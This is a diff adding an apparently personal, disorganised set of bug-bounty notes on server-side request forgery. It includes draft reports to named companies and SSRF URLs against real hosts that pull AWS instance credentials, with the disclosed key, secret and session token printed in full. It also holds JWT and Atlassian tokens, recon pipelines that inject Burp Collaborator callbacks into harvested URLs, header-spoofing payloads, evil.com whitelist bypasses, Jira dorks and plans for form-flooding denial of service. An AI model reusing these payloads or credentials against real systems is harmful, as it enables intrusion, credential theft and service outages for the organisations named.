@@ -1,0 +1,1201 @@
+SSRF
+
+
+https://quizlet.com/cdn-cgi/image/f=auto,fit=cover,h=100,onerror=redirect,w=120/https://farm1.staticflickr.com@615pcsnienat67065o6uulidm4swgl.burpcollaborator.net/175/455279239_720dfc98c8.jpg
+
+proxy
+page
+width
+url
+redirect
+file
+height
+cdn-cgi
+localhost
+
+
+Hi ipsy team,
+
+
+Aditya here , I found critical security issues in one of your subdomain . Please look into it
+
+Title: SSRF leads to internal port scan and disclosing information about AWS metadata
+Severity : P1
+
+Description:
+The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. However, in many cases, it can indicate a vulnerability with serious consequences. Appending special characters/payloads in GET based URL gives information. 
+
+Endpoint: https://images.shopper.ipsy.com/720,fit,q85/payload_here
+
+Steps for port scan:
+1. https://images.shopper.ipsy.com/720,fit,q85/http://localhost:8080
+2. After "localhost:" add ports like 8080,22,21,25 and see the response 
+
+80
+image.png
+image.png
+
+
+
+
+URLs
+
+Port Scan
+
+https://images.shopper.ipsy.com/720,fit,q85/http://localhost:8080
+https://images.shopper.ipsy.com/720,fit,q85/http://localhost:22
+
+
+AWS Metadata URL:
+
+https://images.shopper.ipsy.com/300,fit,q1/http://169.254.169.254/latest/meta-data/iam/security-credentials/imageproxy_server
+
+
+Disclosed Data:
+{
+  "Code" : "Success",
+  "LastUpdated" : "2022-01-29T08:50:42Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIARD6GXVWXRFRNHUOO",
+  "SecretAccessKey" : "zAjOKFFliRgAoQwwlVvjUh+5qCUoMwTUwR9Q8rbd",
+  "Token" : "IQoJb3JpZ2luX2VjEMH//////////wEaCXVzLWVhc3QtMSJHMEUCIQDngpLHpcc0SUbQRcvq1+YWoIkIgxub2xYC2XLjbjpMAgIgIxoyoPHR+D9+h+dZqDbh5VmfP0BhOZpsA040nDcOSpkqgwQI6v//////////ARADGgwwNzcxODkzMjgzMDMiDMXFebMKEq8i7UrFnCrXAw2EI4Uq6KcUeSJ/6hx+TdeALNPSp+rUZGEZxSXEVcgDbeUbaitQpQiD+0IlzlMfCdyKEx2EVLy6boKMNZp8WUqiNQ9l6m7WQwhJQZpNoIq9R0Z8xbLPb1nqekNsw0g/8M91+4E7padeMeluSaY8eRPB0kHYoV3dX6Q7hmwPr65EA3/PSiyr847ALsmgFiCWe5x2pUwp7J9ACKH1S9an4Ins8XUtCboGdKS1IOjSPcL1cQdkoanBv/g74jHYEyLZO9vQ3PKMvDTpGTlsCkIk0gIofPrYjuUs7bWhMkZK4hfkdiv3/q5fqN+K6B2CXMkIf6guHuxcmAYn+ro9dGYrkbmxUBIEVvSmfZbmQJ6xJpiletRxQC+EMcI/7ykrQ/X9MU+4I2AzmA9nOqURJH5F+8BK96etpf4aLYn2FviolQ7JrzLAEnJyawAjbfZ2v0azQOEYeJ8AP9h6akGQTmwDIp4Yaj6YYqyZQfOkVW8yLSH06gWPcT/7BUAnTWvAQpMSa5S4NEexgF2kZZS9FpPzFHvrRE/SeVENP+JsmJBbQpVAFpN4gBwYPm2sll35ckyuvcddJ5WpbOK61jwRkYzvwTU2HLeRh9j2ec9qjTUt4DihE38d0++TojCHgNSPBjqlAZ7W3iRIZvN6MXnYgHwSkJa8Cq6IZRHT2N1AhKilXRu8F/i+AKtJc3WX3V8QoccFV4BTavfcSWUPOIAyJFgWfAhFLziVixWh4egkUu4mox6fx32Ggbi3BVTQoww7oODkWtdIX4U4hjwDPJj2Kah7q93Wi0I492t7gK2ymakQtvpgAT4f2kpflSshtRbrxqN7yIgrpoL0iaIs3h6P6EmdWc9QZayKUw==",
+  "Expiration" : "2022-01-29T15:02:44Z"
+}
+
+Hello knaw team,
+
+I aditya found security issue in your system where SSRF is leading to port scan
+
+Title: Internal SSRF to scan ports and force to make HTTP request
+
+Description:
+The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. However, in many cases, it can indicate a vulnerability with serious consequences. Appending special characters/payloads in GET based URL gives information.
+
+Steps:
+1. Open URL https://tomcat.tiler01.huygens.knaw.nl/adore-djatoka/viewer2.1.html?rft_id=http://localhost:8080/jp2/14759615811661.jp2
+On port 8080 its giving instant response
+2.https://tomcat.tiler01.huygens.knaw.nl/adore-djatoka/viewer2.1.html?rft_id=http://localhost:80/jp2/14759615811661.jp2
+Its giving slow response or taking time to response
+3. https://tomcat.tiler01.huygens.knaw.nl/adore-djatoka/viewer2.1.html?rft_id=http://localhost:8080/jp2/14759615811661.jp2
+Changed localhost to 127.0.0.1 , 0.0.0.0 , [::]
+4. Capture URL in burp suite > Send to intruder
+5. Add port position as attacking position "8080"
+6. Go to payloads > numbers > from 1 to 10000 | step 1 = Start attack
+7. Observe the response where port 8080 is giving 200 OK and remaining are giving 404 etc
+
+Impact:
+As an attacker I am able to perform port scan internally , localhost payloads working (Blacklist payload) . Able to induce server to make HTTP request on different ports like 8080,443,80(DNS)
+POC:
+
+image.png
+
+
+
+
+
+502
+503
+
+
+
+
+
+
+
+SSRF automation
+
+
+subfinder -d target.com | httpx | tee subs.txt | sleep 3600; | cat subs.txt | waybackurls | tee data.txt | sleep 3600; | cat data.txt | gf ssrf | tee ssrf.txt
+
+
+cat data.txt | grep "=" | qsreplace "hj4w5jlbpl95sx2i9wmip1o9r0xrlg.burpcollaborator.net" | tee ssrf.txt; ffuf -c -w ssrf.txt -u FUZZ
+
+
+
+
+Keywords for SSRF 
+
+
+proxy
+page
+width
+url
+redirect
+file
+height
+cdn-cgi
+localhost
+
+
+Payload crafting 
+
+
+1. subs valid
+2. getting wayback urls | valid urls 
+3. cat waybackurls | gf 
+
+cat wayback | gf ssrf | tee ssrftest.txt
+
+cat ssrftest.txt | grep "=" | qsreplace "https://3kojard9zjcg42auxw0eq1ify64wsl.burpcollaborator.net" | tee ssrf.txt
+
+cat ssrf.txt | httpx -sc 
+
+
+https://player.louisvuitton.com/embed/generic.js?file=http://player.louisvuitton.com.https%3A%2F%2Fshorturl.at%2FhDS05&width=1015&loc=jpn-jp&autostart=false&id=fcplayer
+
+
+https://clickjacker.io/?refer=3kojard9zjcg42auxw0eq1ify64wsl.burpcollaborator.net
+https://clickjacker.io/test?url=3kojard9zjcg42auxw0eq1ify64wsl.burpcollaborator.net
+https://www.clickjacker.io/test?url=3kojard9zjcg42auxw0eq1ify64wsl.burpcollaborator.net
+
+
+BB-TIP
+
+echo minddesign.co.uk | gau | tee test
+cat test | gf sqli | tee sqlitest
+cat sqlitest | grep "=" | qsreplace "'" | tee final
+
+
+
+GF Installation
+
+1. go get -u github.com/tomnomnom/gf
+2. echo 'source $GOPATH/src/github.com/tomnomnom/gf/gf-completion.bash' >> ~/.bashrc
+3. mkdir .gf
+4. cp -r $GOPATH/src/github.com/tomnomnom/gf/examples ~/.gf
+5. git clone https://github.com/1ndianl33t/Gf-Patterns
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+echo 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud | waybackurls | grep "=" | qsreplace "http://169.254.169.254/latest" | 
+
+
+proxy=
+page=
+img=
+red=
+url=
+
+APIPA: 169.254.169.254
+
+
+payload: 
+
+http://169.254.169.254/latest
+https://169.254.169.254/latest
+169.254.169.254/latest
+
+
+
+SSRF 
+
+1. HTTP req is imp
+2. DNS is no use 
+3. HTTP req , Sometimes its no use - IP yours = no ssrf , IP third party - NA
+
+paypal - aws , gcp 
+
+
+Aditya PC [malicous acitivity] = Aryan PC
+
+attacker.com - target.com
+
+
+sales.dell.com/api/us/imgurl=https://evil.com/aditya.xml
+
+
+
+USE
+1. Collaborator
+2. Repeater
+3. Intruder
+
+
+1.Detetction
+
+http 
+
+
+EXPLOIT
+1. Cross port scan p3
+80 HTTP - OPEN 
+443 HTTP - OPEN
+22 Filtered / Closed
+21 Mo req - Clsoed
+3306 DNS
+25 SMTP - OPEN
+8000
+8443
+
+
+PASTE URL fucntion is vulnerable for SSRF leads to cross port scan
+
+
+
+2. File over port + DOS p4 p1
+
+
+POST /links/website HTTP/1.1
+Host: backend-2.short.io
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 140
+Referer: https://app.short.io/
+Origin: https://app.short.io
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVlOTU5MzcxLTZmMGQtNDQzZS04OTFhLTJlNjA1ZTZjMDJiZCIsInVzZXJfaWQiOjEwMjE2NjgsImVtYWlsIjoieWNmZ3ZqaGJrQGdtYWlsLmNvbSIsImxvZ2luSGlzdG9yeUlkIjoiMTRiMzU1ZGMtZjUzMC00NzI2LTk5NmYtNmRhNDc0ZjZmYmYxIiwiaW1wZXJzb25hdGUiOmZhbHNlLCJpYXQiOjE2OTEyMzAzNjIsImV4cCI6MTY5MzgyMjM2MiwiaXNzIjoiYXV0aG9yaXplciJ9.WDd0Nt_WYeNXNg_se82pmMP5GaOkuXBZWf-Knaz6Xow
+Connection: close
+
+{"originalURL":"wzzd95ogm3ehqi0na2v3y2olhcn2br.burpcollaborator.net:443/admin","domain":"arnk.short.gy","source":"website","allowDuplicates":true}
+
+
+1.1 Clear all position
+1.2 url:443/admin - add admin as attack pos
+1.3 Go to payloads 
+1.4 Add from list 
+1.5. Server side variable names > Start attack
+
+
+
+
+3. Backend system scan p2
+4. Whitelist bypass p2 p1
+5. AWS metadata retrive P1
+
+
+Where check
+
+1. POST req 
+GET request
+
+
+ADD image
+Add link , URL
+Add data - bio , name , last name
+Headers
+Update link
+
+
+AJdAgnqCST4iPtnUxiGtTz
+
+
+curl -X POST \
+    -d url="https://9mwt039uxglj13wwecrd5u8klbr1fq.burpcollaborator.net/aditya.png" \
+    "https://www.filestackapi.com/api/store/S3?key=AJdAgnqCST4iPtnUxiGtTz"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    ===================================================================================================================================================================
+    https://tomcat.tiler01.huygens.knaw.nl/
+
+
+
+
+
+
+
+
+
+
+
+Where 
+1. Register Form : 100
+2. Feedback Form : 100 GB | 50*50 GB = 50 GB
+3. Comments : 100
+4. File Upload : 100
+5. Contact Us : 50
+
+Impact:
+1. Service will down
+2. Other legit users cant send feedback
+3. Backend Crash
+4. Service will slow
+
+
+TA:
+Session : 1
+Cookies : 1
+Headers : 1
+Values  : 1
+Parameters : 1
+Payload : 
+
+5MB = 1 Form
+
+
+As an attacker 20k 
+
+20000*5
+1000000
+
+100GB
+
+
+Jsfuck
+
+Payload:
+
+
+How much Time : 3000 to 5000 time 
+
+
+Status Code :
+501
+502
+503
+
+
+4 GB = 2GB
+
+GTA 5 65 GB
+
+P2
+
+
++++++++++++++++++++++++++++++++
+
+Comment Injection EXT SSRF
+
+
+Where we can comment = article , post , image , blogs , forums , reply , reviews 
+
+
+Burp Collaborator 
+
+
+<p>Sorry! New URL is: <a href="https://shorturl.at/dtDEU">https://google.com</a></p>
+
+
+Aditya = kongsec.io
+
+
+Hi team,
+
+
+Aditya here found insecure function exploitation on app.october.eu
+
+Bug: Business logic vulnerability in invite function leads to victim response fetching via email of october.eu
+
+While testing I found behavior in invite
+function that sends hook mail to 
+which we put in email section. Whenever we
+get email it shows NAME and some data. I used
+Burp_Collaborator_Link.net" So I got mail which
+was showing link
+Burp_Collaborator_Link.net and the link is in
+blue part so once who click on It will fetch
+response of that person or victim. Main point is
+Ifl registers the form with email of victim and
+hit send it ill send mail on victim email
+address via october address 
+
+How it will impact victim ?
+
+Hacker will use email id of victim for invite
+process. In every section hacker will use
+collaborator link or grabbing link and registered
+with victim email address. Victim will receive
+mail with link once user interacted with link hacker will
+get response in POLL
+
+
+Business impact:
+
+
+Normal user will think he got mail from october.eu but as we know function dont have security to verify invite . So it will harm multiple users on behalf on october.eu 
+
+Bug verified by other company also.
+
+
+I hope you will patch it soon
+
+
+
+sub.samsung.com =  IP aws 
+
+
+1. HTTP is important | DNS = no use
+2. Not every HTTP is SSRF
+3. HTTP IP = if its yours then no SSRF
+
+Always Exploit
+
+market.nokia.com = IP = 
+SSRF:
+
+External : Third Party service : Aws , gcp , 	
+Internal : Sys based, IP based , Network based
+
+https://site.com/index/profile?img=https://site.sub.com/image.png
+
+Where
+Register Form : Name , Last name 
+Profile Bio
+Headers
+Add or insert Link
+Check URL
+Verify URL
+
+
+How 
+1. Burp Collaborator
+2. CollaboratorEverywhere
+
+
+
+X-Forwarded-For:
+
+Detection
+
+HTTP://1oq5ai06ny6ifimgthixx91wwn2dq2.burpcollaborator.net
+HTTPS://1oq5ai06ny6ifimgthixx91wwn2dq2.burpcollaborator.net
+
+
+Request:
+POST /links/website HTTP/1.1
+Host: backend-2.short.io
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@rqlyt78m77votgjznmnoluqgf7lykq8f.burpcollaborator.net
+Accept: */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 146
+Origin: https://app.short.io
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjQ2NDc4YmE2LTI5MDUtNDc2MC1iM2I1LTE5NDhiMmE2ZGMyZCIsInVzZXJfaWQiOjM1Mzk3NywiZW1haWwiOiJoa2RzYmZoZGJAZ21haWwuY29tIiwibG9naW5IaXN0b3J5SWQiOiI0YzM2ZGZjMy03NDM4LTQzNDktYjJlMi00Mjk0YWZhYWIyODQiLCJpYXQiOjE2NDI4NDc3NjIsImV4cCI6MTY0NTQzOTc2MiwiaXNzIjoiYXV0aG9yaXplciJ9.FUUuuEEpd84ydIMg2IBr3AIT-bippT9yXrG92MgjQeA
+Referer: http://dizklt08ztnal2blf8fadgi27tdkblza.burpcollaborator.net/ref
+Connection: close
+Cache-Control: no-transform
+CF-Connecting_IP: spoofed.l9vsc1rgq1eica2t6g6i4o9ay14s2pqe.burpcollaborator.net
+Client-IP: spoofed.gcwnfwubtwhdf55o9b9d7jc51w7n5lta.burpcollaborator.net
+X-Wap-Profile: http://llaso13g21qioaetigiigolaa1gser2g.burpcollaborator.net/wap.xml
+True-Client-IP: spoofed.0pq7sg7v6guxspi8mvmxk3ppegk7i76w.burpcollaborator.net
+X-Real-IP: spoofed.hg1ojxycxxlej69pdcdebkg65xbo9qxf.burpcollaborator.net
+X-Forwarded-For: spoofed.kj7rm01f00ohm9csgfghenj980ercu0j.burpcollaborator.net
+From: root@pkdwn52k15pmnedxhkhmfske95fwd01p.burpcollaborator.net
+Contact: root@utr1wabpaayrwjm2qpqroxtjiao1m6av.burpcollaborator.net
+X-Originating-IP: spoofed.lmbsp14g31ripaftjgjihomab1hsgi47.burpcollaborator.net
+Forwarded: for=spoofed.0fg7igxvwgkxip88cvcxa3fp4ga79yxn.burpcollaborator.net;by=spoofed.0fg7igxvwgkxip88cvcxa3fp4ga79yxn.burpcollaborator.net;host=spoofed.0fg7igxvwgkxip88cvcxa3fp4ga79yxn.burpcollaborator.net
+X-Client-IP: spoofed.z5568fnumfaw8oy72u2w025ouf06zzno.burpcollaborator.net
+
+{"originalURL":"http://68cz0df7c4eurht8izyus6gkub02or.burpcollaborator.net:25","domain":"344r.short.gy","source":"website","allowDuplicates":true}
+Exploit
+1. Port Scan P3 400 - 950
+Open : HTTP
+Closed : Nothing/DNS
+
+80
+21
+22
+25
+8443
+443
+8080
+3306
+
+34.229.82.105
+
+200 Ports 
+
+10 OPEN 
+190 closed
+
+2. File over port
+3. Backend System/machine Scan
+4. CDN-CGI exploit
+Wayback
+5. AWS SSRF exploit 
+6. SSRF to Dos : {"originalURL":"http://68cz0df7c4eurht8izyus6gkub02or.burpcollaborator.net:7/index"} 1000 PORTS 502
+7. Whitelist Bypass 
+65535 = 40535
+20000 OPEN
+[{"data":{"linkPostPreview":{"status":"PROCESSING","preview":null}}}]
+
+
+https://quizlet.com/cdn-cgi/image/f=auto,fit=cover,h=100,onerror=redirect,w=120/https://farm1.staticflickr.com/177/443368970_2550c05bd5.jpg
+
+
+WhiteList
+
+#
+@
+.
+
+https://quizlet.com/cdn-cgi/image/f=auto,fit=cover,h=100,onerror=redirect,w=120/https://farm1.staticflickr.com.e3izhgppp50o5ys99mc7dou4nvtmhb.burpcollaborator.net/177/443368970_2550c05bd5.jpg
+
+
+https://farm1.staticflickr.com.6jqrx85h5xgglq81pesztgaw3n9hx6.burpcollaborator.net/177/443368970_2550c05bd5.jpg
+
+
+https://process.fs.grailed.com/AJdAgnqCST4iPtnUxiGtTz/auto_image/cache=expiry:max/rotate=deg:exif/resize=width:210/output=quality:70/compress/https://process.fs.grailed.com@r2ucgto2oiz14brm8zbkc1thm8s6gv.burpcollaborator.net/4srXcOuSkGLoFEAQb6Uk
+
+
+
+
+burplink.net::8080 123.45.67.89 nmap IP 8080 443
+
+X-Forwarded-For: http://burplink.net::
+
+burplink.net::[22]:1
+
+
+8080,22,25,443,3306
+
+{profile_uri:http://burplink.net}
+
+
+127.0.0.1
+0.0.0.0
+localhost
+127.1/Admin
+double encoding URl
+
+
+http://developer.blackberry.com/devzone/files/burplink.net/design/bb10/Wireframe_Slides_BB10_3.ppt
+
+Dorks for testing:
+
+https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwjktcGvvd3oAhXg4jgGHYctAaUQFjAAegQIAxAB&url=https%3A%2F%2Fdex.hu%2Fx.php%3Fid%3Dtotalcar_magazin_cikklink%26url%3Dhttp%253A%252F%252Fen.wikipedia.org%252Fwiki%252FUniform_Resource_Identifier&usg=AOvVaw0jWeJNWIgR8eM65PmT9lqa
+
+
+https://jira.canallabs.fr/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
+
+http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
+
+https://jira.intellectdesign.com/plugins/servlet/oauth/users/icon-uri?consumerUri=https%3A%2F%2Fgoogle.com
+https://mattel.cprime.com/jira/plugins/servlet/oauth/users/icon-uri?consumerUri=https%3A%2F%2Fgoogle.com
+http://adoptivefam.org/plugins/servlet/oauth/users/icon-uri?consumerUri=https%3A%2F%2Fgoogle.com
+https://jira.fellowshipchurch.com:8443/plugins/servlet/oauth/users/icon-uri?consumerUri=https%3A%2F%2Fgoogle.com
+
+
+tesla.com/site/verify?uri=http://dashboard.domain.com@evil.com
+
+
+http://www.opensource.apple.com/source/files/files-599.15/Library/Documentation/Acknowledgements.rtf
+
+inurl:"/plugins/servlet/oauth/users/icon-uri?consumerUri="
+http://jira.exeliatech.com:8000/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1
+
+http://i.dell.com/sites/doccontent/shared-content/data-sheets/fr/Documents/http://127.0.0.1/
+
+/admin/data?id=
+
+
+
+
+
+
+127.0.0.1 db url
+
+%23e=octet
+
+
+
+
+
+site.com/index/user/api?file=https://sub.site.com/abc.pdf
+
+External SSRF
+Internal SSRF
+
+Where ?
+Register : Name , Last name
+Insert URL
+Add URL
+Verify URL
+Paramaters
+
+
+If IP is yours then its not SSRF
+NOT evry HTTP IP is SSRF
+
+Always exploit
+
+
+Port Scan
+
+
+If port is open = HTTP request in collaborator
+If port is closed = DNS or nothing
+
+
+AWS Metadata SSRF
+
+Detection : WHOISIP 
+
+IP = AWS , GCP , DO etc 
+
+
+Function : Insert URL 
+
+SSRF IP = AWS 
+
+
+APIPA range = http://169.254.169.254/latest/meta-data
+
+
+https://quizlet.com/cdn-cgi/image/f=auto,fit=cover,h=100,onerror=redirect,w=120/https://farm1.staticflickr.com/10/15574189_44735baed9.jpg
+
+
+Hi ipsy team,
+
+
+Aditya here , I found critical security issues in one of your subdomain . Please look into it
+
+Title: SSRF leads to internal port scan and disclosing information about AWS metadata
+Severity : P1
+
+Description:
+The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. However, in many cases, it can indicate a vulnerability with serious consequences. Appending special characters/payloads in GET based URL gives information. 
+
+Endpoint: https://images.shopper.ipsy.com/720,fit,q85/payload_here
+
+Steps for port scan:
+1. https://images.shopper.ipsy.com/720,fit,q85/http://localhost:8080
+2. After "localhost:" add ports like 8080,22,21,25 and see the response 
+
+80
+image.png
+image.png
+
+
+
+
+URLs
+
+Port Scan
+
+https://images.shopper.ipsy.com/720,fit,q85/http://localhost:8080
+https://images.shopper.ipsy.com/720,fit,q85/http://localhost:22
+
+
+AWS Metadata URL:
+
+https://images.shopper.ipsy.com/300,fit,q1/http://169.254.169.254/latest/meta-data/iam/security-credentials/imageproxy_server
+
+
+Disclosed Data:
+{
+  "Code" : "Success",
+  "LastUpdated" : "2022-01-29T08:50:42Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIARD6GXVWXRFRNHUOO",
+  "SecretAccessKey" : "zAjOKFFliRgAoQwwlVvjUh+5qCUoMwTUwR9Q8rbd",
+  "Token" : "IQoJb3JpZ2luX2VjEMH//////////wEaCXVzLWVhc3QtMSJHMEUCIQDngpLHpcc0SUbQRcvq1+YWoIkIgxub2xYC2XLjbjpMAgIgIxoyoPHR+D9+h+dZqDbh5VmfP0BhOZpsA040nDcOSpkqgwQI6v//////////ARADGgwwNzcxODkzMjgzMDMiDMXFebMKEq8i7UrFnCrXAw2EI4Uq6KcUeSJ/6hx+TdeALNPSp+rUZGEZxSXEVcgDbeUbaitQpQiD+0IlzlMfCdyKEx2EVLy6boKMNZp8WUqiNQ9l6m7WQwhJQZpNoIq9R0Z8xbLPb1nqekNsw0g/8M91+4E7padeMeluSaY8eRPB0kHYoV3dX6Q7hmwPr65EA3/PSiyr847ALsmgFiCWe5x2pUwp7J9ACKH1S9an4Ins8XUtCboGdKS1IOjSPcL1cQdkoanBv/g74jHYEyLZO9vQ3PKMvDTpGTlsCkIk0gIofPrYjuUs7bWhMkZK4hfkdiv3/q5fqN+K6B2CXMkIf6guHuxcmAYn+ro9dGYrkbmxUBIEVvSmfZbmQJ6xJpiletRxQC+EMcI/7ykrQ/X9MU+4I2AzmA9nOqURJH5F+8BK96etpf4aLYn2FviolQ7JrzLAEnJyawAjbfZ2v0azQOEYeJ8AP9h6akGQTmwDIp4Yaj6YYqyZQfOkVW8yLSH06gWPcT/7BUAnTWvAQpMSa5S4NEexgF2kZZS9FpPzFHvrRE/SeVENP+JsmJBbQpVAFpN4gBwYPm2sll35ckyuvcddJ5WpbOK61jwRkYzvwTU2HLeRh9j2ec9qjTUt4DihE38d0++TojCHgNSPBjqlAZ7W3iRIZvN6MXnYgHwSkJa8Cq6IZRHT2N1AhKilXRu8F/i+AKtJc3WX3V8QoccFV4BTavfcSWUPOIAyJFgWfAhFLziVixWh4egkUu4mox6fx32Ggbi3BVTQoww7oODkWtdIX4U4hjwDPJj2Kah7q93Wi0I492t7gK2ymakQtvpgAT4f2kpflSshtRbrxqN7yIgrpoL0iaIs3h6P6EmdWc9QZayKUw==",
+  "Expiration" : "2022-01-29T15:02:44Z"
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+==============
+keyword: lout
+
+EP: jira/projects
+
+Summary: Atlassian token disclosure and crafting nested queries with internal port scan as SSRF may leads to application level DOS
+
+Steps to reproduce:
+  1.  Use this in cmd:  curl -v https://onduo.com --user admin@onduollc.atlassian.net:2f62f85b-0b5e-4ea0-baf8-a57f8fb4f9a3_8ad836cdf79bba5c679a48e0d92f5fbe57b7cb0e_lout
+
+  2. I got this token from burpsuite spidering of accredible.atlassian.net
+
+  3. Now run this curl -v https://accredible.com:22 --user admin@accredible  .atlassian.net:e682d3ad-26d0-4cc1-8dc4-91d7b1376b57_6f7864e1a43c4347ebd0442227f4808d582792b1_lout
+
+We can see the time delay on port change 80,8080 giving instant response but 22 port giving late reponse
+
+Browser/OS:  NA/ Firefox
+
+Attack scenario:
+A successful SSRF attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.
+
+An SSRF exploit that causes connections to external third-party systems might result in malicious onward attacks that appear to originate from the organization hosting the vulnerable application, leading to potential legal liabilities and reputational damage.
+
+When we check command on 80,8080 port it gives speedy response but on port 22 it gives late response . It means 22 closed. If hacker perform this attack like port scan then this may leads to DOS
+
+
+
+
+
+I got token while crawling whole web app or else simple method is that we can check source code on following endpoint-- https://accredible.atlassian.net/projects
+
+Steps to reproduce issue:
+1. Check source code of  https://accredible.atlassian.net/projects
+2. Search for "atlassian-token"
+3. Atlassian token can be used for crafting nested queries but I escalated this to SSRF port scan
+4. Syntax for crafting next queries :  curl -v  https://mainhost.com --user anyuser@target.atlassian.net:atlassian_token_here_lout
+
+Exploit command:
+1. On port 80
+curl -v https://accredible.com:80 --user admin@accredible.atlassian.net:e682d3ad-26d0-4cc1-8dc4-91d7b1376b57_6f7864e1a43c4347ebd0442227f4808d582792b1_lout  
+
+It crafted queries and gives us valid response , We can say instant response
+image.png
+
+2. On port 22
+curl -v https://accredible.com:22 --user admin@accredible.atlassian.net:e682d3ad-26d0-4cc1-8dc4-91d7b1376b57_6f7864e1a43c4347ebd0442227f4808d582792b1_lout  
+It gave me response after 1 min 45 seconds :" failed to connect on port 22"
+image.png
+
+3. On port 443
+curl -v https://accredible.com:443 --user admin@accredible.atlassian.net:e682d3ad-26d0-4cc1-8dc4-91d7b1376b57_6f7864e1a43c4347ebd0442227f4808d582792b1_lout  
+It gave me response which was instant with crafted queries
+
+
+Command is curl -v https://accredible.com:443 --user admin@accrediblellc.atlassian.net:9c0fc891-2e3b-49d4-a94d-6e2a409d1daf_711d800a83753ef92686d0ed61fd2b8a4cfb41d6_lout
+
+
+Also I tried same command with port 3306 it takes a long time
+
+
+Impact: The first part is , It gives instant response on open port and when I try with closed port like 3306,22 it takes long to craft queries
+
+So If hacker try same attacks on closed ports so the command will force a server to craft queries because of a closed port it's not going to craft it . Performing same attack on closed ports to craft queries will make server engage and this may leads to DOS attack. 
+
+
+
+
+
+
+curl -v https://accredible.com:80 --user admin@accredible.atlassian.net:e682d3ad-26d0-4cc1-8dc4-91d7b1376b57_6f7864e1a43c4347ebd0442227f4808d582792b1_lout
+
+
+
+On port 22
+curl -v https://accredible.com:22 --user admin@accredible.atlassian.net:e682d3ad-26d0-4cc1-8dc4-91d7b1376b57_6f7864e1a43c4347ebd0442227f4808d582792b1_lout  
+
+
+On port 443
+curl -v https://accredible.com:443 --user admin@accredible.atlassian.net:e682d3ad-26d0-4cc1-8dc4-91d7b1376b57_6f7864e1a43c4347ebd0442227f4808d582792b1_lout 
+
+
+
+
+===============================================
+
+
+
+Hi team,
+
+
+I found JQL injection in https://wiki.eveoh.nl
+
+
+Description
+The JQL query in our case limits the data to one project and a specific (and rather short) time range (the current month). This restriction is hard-coded and should not change. However, a crafted user value allows us to remove this limitation:
+Martin Schneider' OR created < '2021-01-01
+Now the query becomes
+project = TeamA AND created > startOfMonth() AND assignee = 'Martin Schneider' OR created < '2021-01-01'
+will fetch all tickets from all projects of the entire JIRA instance!
+
+How to reproduce
+Go to https:// wiki.eveoh.nl /issues/?jql=
+in jql paramter put any heavy load crafted payload
+And perform attack  multiple times
+attack vector is to craft JQL queries with bad performance and thus long runtime. I didn’t explore this in detail, but it’s easy to imagine that queries using JQL functions, especially custom ones, can be designed to become quite expensive. JIRA has some safeguards in place, but this might still open an attack vector to perform DoS attacks by sending multiple such queries at the same time.
+
+
+Solution
+As a security threat, JQL injection is far from being on the same level as SQL injection. However, there are ways an attacker can exploit it. It is important to understand under which circumstances it poses a threat and how to prevent it.
+With security, having multiple layers of protection is a fundamental principle. In my opinion, input sanitisation should always be one of them.
+
+
+
+
+
+
+
+
+
+
+======================
+
+
+
+Hi team,
+
+
+Aditya here found unauthorised access on demo server 
+
+URL: https://jira.typo3.com/servicedesk/customer/user/signup
+
+image.png
+
+CVE 2019-14994 based bug hitting your service based applications Vulnerable This advisory discloses a critical severity security vulnerability. Versions of Jira Service Desk Server and Data Center are affected by this vulnerability. Customers who have downloaded and installed affected versions of Jira Service Desk Server and Data, please upgrade your Jira Service Desk Server and Data Center installations immediately to fix this vulnerability. By design, Jira Service Desk gives customer portal users permissions only to raise requests and view issues. This allows users to interact with the customer portal without having direct access to Jira. These restrictions can be bypassed by a remote attacker with portal access who exploits a path traversal vulnerability. Exploitation allows an attacker to view all issues within all Jira projects contained in the vulnerable instance. This could include Jira Service Desk projects, Jira Core projects, and Jira Software projects. Impact Attacker can raise unlimited issues. Note that attackers can grant themselves access to Jira Service Desk portals that have the 'Anyone can email the service desk or raise a request in the portal' setting enabled. Changing this setting does not defend against an attacker that has portal access via other means. Atlassian does not recommend changing the setting.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+=================================================================
+Hello team,
+
+
+Aditya here found bug which is stored external ssrf and able to capture users logs and IP,s via comment section:
+
+
+Issue background
+
